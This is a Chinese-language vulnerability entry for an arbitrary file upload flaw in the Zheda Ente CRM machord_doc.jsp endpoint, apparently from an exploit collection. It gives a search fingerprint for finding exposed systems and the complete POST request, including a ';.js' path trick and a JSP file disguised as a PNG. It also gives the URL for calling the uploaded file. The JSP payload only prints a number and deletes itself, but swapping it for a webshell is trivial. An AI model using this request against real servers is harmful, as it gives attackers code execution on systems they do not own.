# 浙大恩特CRMmachord_doc任意文件上传漏洞

- **系统**：浙大恩特CRMmachord_doc　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum&fileName=stc.jsp&strAffixStr&oprfilenam=null&gesnum HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 575`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="oprfilenam"
null
--00content0boundary00
Content-Disposition: form-data; name="uploadflg"
0
--00content0boundary00
Content-Disposition: form-data; name="strAffixStr"
--00content0boundary00
Content-Disposition: form-data; name="selfilenam"
--00content0boundary00
Content-Disposition: form-data; name="uploadfile"; filename="stc.jsp"
Content-Type: image/png
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--00content0boundary00--

上传文件位置
GET /enterdoc/Machord/stc.jsp HTTP/1.1
Host:
```

**其他**
- 浙大恩特CRM machord\_doc任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM